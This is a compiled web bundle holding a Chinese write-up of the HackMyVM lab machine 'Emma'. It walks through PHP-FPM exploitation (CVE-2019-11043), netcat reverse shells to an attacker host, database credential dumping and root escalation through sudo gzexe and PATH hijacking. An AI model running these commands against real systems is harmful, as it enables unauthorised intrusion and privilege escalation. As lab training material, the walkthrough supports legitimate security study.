"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8866],{18104:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>t,default:()=>o,frontMatter:()=>i,metadata:()=>c,toc:()=>d});var s=a(85893),r=a(11151);const i={},t="Emma",c={id:"HackMyVM/Machines/Emma/index",title:"Emma",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Emma/index.md",sourceDirName:"HackMyVM/Machines/Emma",slug:"/HackMyVM/Machines/Emma/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Emma/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Emma/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Eighty",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Eighty/"},next:{title:"Flower",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Flower/"}},l={},d=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"\u6f0f\u6d1e\u5229\u7528",id:"\u6f0f\u6d1e\u5229\u7528",level:3},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u6570\u636e\u5e93\u8bbf\u95ee",id:"\u6570\u636e\u5e93\u8bbf\u95ee",level:3},{value:"User - emma",id:"user---emma",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function m(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"emma",children:"Emma"})}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,s.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-02-04"}),(0,s.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 43b7626e2d43405be800ca0c0abb30b6"}),(0,s.jsx)(n.p,{children:"\u2620 Root // 50"}),(0,s.jsx)(n.p,{children:"\ud83d\udc80 User // 55"}),(0,s.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun!"})]}),"\n",(0,s.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,s.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.113\n"})}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 4a:4c:af:92:cc:bb:99:59:d7:2f:1b:99:fb:f1:7c:f0 (RSA)\n|   256 ba:0d:85:69:43:86:c1:91:7c:db:2a:1e:34:ab:68:1e (ECDSA)\n|_  256 a1:ac:2c:ce:f4:07:da:96:12:74:d1:54:9e:f7:09:04 (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u76ee\u5f55\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"[10:46:34] 200 -    0B  - /index.php\n[10:46:34] 200 -    0B  - /index.php/login/\n[10:46:43] 200 -   58KB - /phpinfo.php\n[10:46:47] 200 -   15B  - /robots.txt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"/robots.txt"})," \u5f97\u5230"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"itwasonlyakiss\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"/phpinfo.php"}),"\uff0c\u5f97\u5230\u4ee5\u4e0b\u7248\u672c\u4fe1\u606f"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"PHP Version 7.1.33dev\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u7248\u672c\u4fe1\u606f\u8fdb\u884c\u67e5\u627e\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u8fd9\u4e2a\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"CVE-2019-11043\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u6f0f\u6d1e\u5229\u7528",children:"\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,s.jsxs)(n.p,{children:["\u91c7\u7528 ",(0,s.jsx)(n.a,{href:"https://github.com/neex/phuip-fpizdam",children:"neex/phuip-fpizdam: Exploit for CVE-2019-11043"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'randark@developer:~/code/VNCTF-OnlyLocalSql$ docker run --rm ypereirareis/cve-2019-11043 http://192.168.56.113/index.php\n2024/02/18 05:51:03 Base status code is 200\n2024/02/18 05:51:05 Status code 502 for qsl=1765, adding as a candidate\n2024/02/18 05:51:07 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\n2024/02/18 05:52:15 Attack params found: --qsl 1755 --pisos 22 --skip-detect\n2024/02/18 05:52:15 Trying to set "session.auto_start=0"...\n2024/02/18 05:52:18 Detect() returned attack params: --qsl 1755 --pisos 22 --skip-detect <-- REMEMBER THIS\n2024/02/18 05:52:18 Performing attack using php.ini settings...\n2024/02/18 05:52:20 Success! Was able to execute a command by appending "?a=/bin/sh+-c+\'which+which\'&" to URLs\n2024/02/18 05:52:20 Trying to cleanup /tmp/a...\n2024/02/18 05:52:20 Done!\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230 webshell \u88ab\u6210\u529f\u690d\u5165\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"randark@developer:~/code/VNCTF-OnlyLocalSql$ curl http://192.168.56.113/index.php?a=/bin/bash+-c+whoami\nwww-data\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"# http://192.168.56.113/index.php?a=/bin/sh+-c+%27id;nc%20-c%20bash%20192.168.56.102%209999%27&\\\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[13:55:11] Welcome to pwncat \ud83d\udc08!\n[13:57:01] received connection from 192.168.56.113:49336\n[13:57:01] 192.168.56.113:49336: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@emma:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u6570\u636e\u5e93\u8bbf\u95ee",children:"\u6570\u636e\u5e93\u8bbf\u95ee"}),"\n",(0,s.jsxs)(n.p,{children:["\u91c7\u7528 web \u670d\u52a1 ",(0,s.jsx)(n.code,{children:"/robots.txt"})," \u8fd4\u56de\u7684 ",(0,s.jsx)(n.code,{children:"itwasonlyakiss"})," \u4f5c\u4e3a\u5bc6\u7801"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:"MariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| users              |\n+--------------------+\n\nMariaDB [users]> show tables;\n+-----------------+\n| Tables_in_users |\n+-----------------+\n| users           |\n+-----------------+\n\nMariaDB [users]> select * from users;\n+----+------+----------------------------------+\n| id | user | pass                             |\n+----+------+----------------------------------+\n|  1 | emma | 5f4dcc3b5aa765d61d8327deb882cf80 |\n+----+------+----------------------------------+\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"emma:5f4dcc3b5aa765d61d8327deb882cf80\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---emma",children:"User - emma"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs emma@192.168.56.113\n[14:54:09] Welcome to pwncat \ud83d\udc08!\nPassword: ********************************\n[14:54:12] 192.168.56.113:22: normalizing shell path\n           192.168.56.113:22: registered new host w/ db\n(local) pwncat$ back\n(remote) emma@emma:/home/emma$ whoami\nemma\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) emma@emma:/home/emma$ cat user.txt\nyoudontknowme\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for emma on emma:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser emma may run the following commands on emma:\n    (ALL : ALL) NOPASSWD: /usr/bin/gzexe\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u65f6\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728 suid \u7a0b\u5e8f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lah"',children:"(remote) emma@emma:/home/emma$ ls -lah\ntotal 68K\ndrwxr-xr-x 4 emma emma 4.0K Feb 18 03:48 .\ndrwxr-xr-x 3 root root 4.0K Feb  4  2021 ..\n-rw------- 1 emma emma    5 Feb 18 03:48 .bash_history\n-rw-r--r-- 1 emma emma  220 Feb  4  2021 .bash_logout\n-rw-r--r-- 1 emma emma 3.5K Feb  4  2021 .bashrc\n-rwx------ 1 emma emma 1.9K Feb  4  2021 flag.sh\ndrwx------ 3 emma emma 4.0K Feb 18 01:54 .gnupg\ndrwxr-xr-x 3 emma emma 4.0K Feb  4  2021 .local\n-rw-r--r-- 1 emma emma  807 Feb  4  2021 .profile\n-rw------- 1 emma emma   14 Feb  4  2021 user.txt\n-rwsr-s--- 1 root emma  17K Feb  4  2021 who\n-rw-r--r-- 1 emma emma  185 Feb  4  2021 who.c\n-rw------- 1 emma emma   50 Feb  4  2021 .Xauthority\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u770b",(0,s.jsx)(n.code,{children:"who"}),"\u7a0b\u5e8f\u7684\u6e90\u7801"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",metastring:'title="who.c"',children:'#include <stdio.h>\n#include <stdlib.h>\nvoid main(){\n    setuid(0);\n    setgid(0);\n    printf("Im \\n");\n    system("/bin/id");\n    setuid(1000);\n    setgid(1000);\n    printf("But now Im \\n");\n    system("/bin/id");\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u7531\u4e8e ",(0,s.jsx)(n.code,{children:"gzexe"})," \u538b\u7f29\u7a0b\u5e8f\u540e\uff0c\u518d\u8fd0\u884c\u88ab\u538b\u7f29\u7684\u7a0b\u5e8f\uff0c\u5c31\u4f1a\u8c03\u7528\u4e00\u6b21 ",(0,s.jsx)(n.code,{children:"gzip"}),"\uff0c\u6240\u4ee5\u53ef\u4ee5\u5148\u5bf9 ",(0,s.jsx)(n.code,{children:"id"})," \u8fdb\u884c\u538b\u7f29\u64cd\u4f5c\uff0c\u7136\u540e\u5c06\u6076\u610f\u8f7d\u8377\u690d\u5165 ",(0,s.jsx)(n.code,{children:"unzip"})," \u4e2d\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u63d0\u6743"]}),"\n",(0,s.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'emma@emma:~$ sudo -u root /usr/bin/gzexe /bin/id\nemma@emma:~$ cd /tmp\nemma@emma:/tmp$ echo "nc -e /bin/bash 192.168.56.102 7777" > gzip\nemma@emma:/tmp$ chmod +x gzip\nemma@emma:/tmp$ export PATH=/tmp:$PATH\nemma@emma:/tmp$ cd\nemma@emma:~$ ./who\n'})}),"\n",(0,s.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"itsmeimshe\n"})})]})}function o(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(m,{...e})}):m(e)}},11151:(e,n,a)=>{a.d(n,{Z:()=>c,a:()=>t});var s=a(67294);const r={},i=s.createContext(r);function t(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);